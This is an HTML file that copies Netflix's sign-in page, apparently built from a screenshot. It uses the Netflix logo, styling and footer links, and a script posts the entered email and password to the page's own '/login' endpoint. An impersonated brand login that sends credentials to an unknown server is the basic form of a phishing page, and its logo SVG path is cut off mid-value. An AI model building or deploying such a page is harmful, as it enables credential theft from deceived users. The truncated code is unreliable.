<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <style>
        /* --- CSS Reset --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* --- Base Styles --- */
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            line-height: 1.4;
        }

        a {
            color: #fff;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        /* --- Site Wrapper & Background --- */
        .site-wrapper {
            min-height: 100vh;
            background-image: linear-gradient(rgba(0, 0, 0, 0.65), rgba(0, 0, 0, 0.65)), 
                              url('https://cdn.mos.cms.futurecdn.net/rDJegQJaCyGaYysj2g5XWY-650-80.jpg.webp');
            background-size: cover;
            background-position: center;
            display: flex;
            flex-direction: column;
        }

        /* --- Header --- */
        .site-header {
            padding: 20px 4%;
        }

        .logo {
            fill: #E50914; /* Netflix Red */
            height: 36px;
            width: auto;
        }

        /* --- Main Login Content --- */
        .login-main {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            padding: 40px 0 80px 0;
        }

        .login-form-container {
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
            padding: 60px 68px 40px 68px;
            max-width: 450px;
            width: 90%;
            min-height: 660px;
        }

        .login-form-container h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 28px;
        }

        /* --- Form Elements --- */
        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            height: 50px;
            background-color: rgba(51, 51, 51, 0.7); /* Changed from #333 to be transparent */
            border: none;
            border-radius: 4px;
            padding: 16px 20px;
            color: #fff;
            font-size: 16px;
            margin-bottom: 16px;
        }

        .login-form input[type="text"]::placeholder,
        .login-form input[type="password"]::placeholder {
            color: #8c8c8c;
        }

        .btn {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .btn-signin {
            background-color: #E50914;
            color: #fff;
            margin-top: 24px;
            margin-bottom: 12px;
        }

        .or-divider {
            text-align: center;
            color: #b3b3b3;
            font-size: 14px;
            margin: 16px 0;
        }

        .btn-code {
            background-color: rgba(70, 70, 70, 0.7);
            color: #fff;
            border: 1px solid rgba(128, 128, 128, 0.7);
        }
        
        .btn-code:hover {
            background-color: rgba(90, 90, 90, 0.7);
        }

        .forgot-password {
            display: block;
            text-align: center;
            color: #b3b3b3;
            font-size: 14px;
            margin-top: 16px;
        }

        .forgot-password:hover {
            color: #fff;
        }

        /* --- Form Options & reCAPTCHA --- */
        .login-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #b3b3b3;
            font-size: 14px;
            margin-top: 12px;
        }
        
        .remember-me {
            display: flex;
            align-items: center;
            cursor: pointer;
        }

        .remember-me input[type="checkbox"] {
            width: 18px;
            height: 18px;
            margin-right: 5px;
            accent-color: #b3b3b3;
        }

        .signup-link {
            margin-top: 16px;
            color: #737373;
            font-size: 16px;
        }

        .signup-link a {
            color: #fff;
            font-weight: 500;
        }

        .recaptcha {
            font-size: 13px;
            color: #8c8c8c;
            margin-top: 16px;
            line-height: 1.5;
        }

        .recaptcha a {
            color: #0071eb; /* Blue link from screenshot */
        }

        /* --- Footer --- */
        .site-footer {
            background-color: #141414; /* Changed from black to a dark gray */
            padding: 50px 4%;
            color: #a0a0a0; /* Was #737373 */
            margin-top: 50px;
        }
 
        .footer-top {
            font-size: 16px;
            margin-bottom: 30px;
        }
        
        .footer-top a {
            color: #a0a0a0; /* Was #737373 */
        }
 
        .footer-links {
            list-style: none;
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            font-size: 13px;
            margin-bottom: 30px;
        }
 
        .footer-links li a {
            color: #a0a0a0; /* Was #737373 */
        }
 
        .language-selector select {
            background-color: #000;
            color: #a0a0a0; /* Was #737373 */
            border: 1px solid #333;
            padding: 12px 20px;
            font-size: 14px;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-image: url('data:image/svg+xml;utf8,<svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11.6 6.5C11.75 6.5 11.82 6.68 11.72 6.78L8.2 10.3C8.08 10.42 7.92 10.42 7.8 10.3L4.28 6.78C4.18 6.68 4.25 6.5 4.4 6.5H11.6Z" fill="%23a0a0a0"/></svg>'); /* Arrow color was #737373 */
            background-repeat: no-repeat;
            background-position: right 15px center;
            padding-right: 40px; /* Space for dropdown arrow */
        }

        /* --- Responsive Design --- */
        @media (max-width: 740px) {
            .login-form-container {
                padding: 40px 30px;
                max-width: 100%;
                min-height: 0;
            }

            .site-header {
                padding: 20px;
            }
            
            .logo {
                height: 28px;
            }
            
            .login-form-container h1 {
                font-size: 28px;
            }

            .footer-links {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        
        @media (max-width: 500px) {
             .site-wrapper {
                /* On small screens, Netflix often removes the complex background 
                   but we'll keep it as requested, just ensure form is readable */
                background-image: none;
             }
             
             .login-main {
                 padding: 20px 0 40px 0;
             }
             
             .login-form-container {
                 width: 100%;
                 padding: 30px 20px;
             }
             
             .site-footer {
                 padding: 30px 4%;
                 /* Remove footer background to blend with black body */
                 background-color: transparent; 
                 border-top: 1px solid #222;
                 margin-top: 20px;
             }
        }
    </style>
    
</head>
<body>

    <div class="site-wrapper">
        <!-- Header with Netflix Logo -->
        <header class="site-header">
            <a href="#">
                <!-- Embedded Netflix Logo SVG -->
                <svg class="logo" viewBox="0 0 111 30" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img">
                    <g>
                        <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.684                     </g>
                </svg>
            </a>
        </header>

        <!-- Main Login Form -->
        <main class="login-main">
            <div class="login-form-container">
                <h1>Sign In</h1>
                
                <form class="login-form" id="loginForm">
                    <input type="text" id="email" placeholder="Email" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit" class="btn btn-signin">Sign In</button>
                    
                    <div class="or-divider">OR</div>
                    
                    <button type="button" class="btn btn-code">Use a Sign-In Code</button>
                    
                    <a href="#" class="forgot-password">Forgot password?</a>
                </form>

                <div class="login-options">
                    <label class="remember-me">
                        <input type="checkbox" checked>
                        <span>Remember me</span>
                    </label>
                </div>
                
                <div class="signup-link">
                    New to Netflix? <a href="/signup">Sign up now</a>.
                </div>

                <div class="recaptcha">
                    This page is protected by Google reCAPTCHA to ensure you're not a bot. 
                    <a href="#">Learn more.</a>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="site-footer">
            <div class="footer-container">
                <p class="footer-top">Questions? <a href="#">Contact us</a>.</p>
                <ul class="footer-links">
                    <li><a href="#">FAQ</a></li>
                    <li><a href="#">Help Center</a></li>
                    <li><a href="#">Terms of Use</a></li>
                    <li><a href="#">Privacy</a></li>
                    <li><a href="#">Cookie Preferences</a></li>
                    <li><a href="#">Corporate Information</a></li>
                </ul>
                <div class="language-selector">
                    <select name="language" id="lang-select">
                        <option value="en" selected>English</option>
                    </select>
                </div>
            </div>
        </footer>
    </div>
    
    <script>
        (function(){
            const form = document.getElementById('loginForm');
            if (!form) return;
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                const email = document.getElementById('email').value.trim();
                const password = document.getElementById('password').value;
                try {
                    const response = await fetch('/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email, password })
                    });
                    const result = await response.json();
                    if (response.ok) {
                        window.location.href = result.redirect || '/browse';
                    } else {
                        alert(result.message || 'Login failed.');
                    }
                } catch (err) {
                    alert('Could not connect to the server.');
                }
            });
        })();
    </script>

</body>
</html>
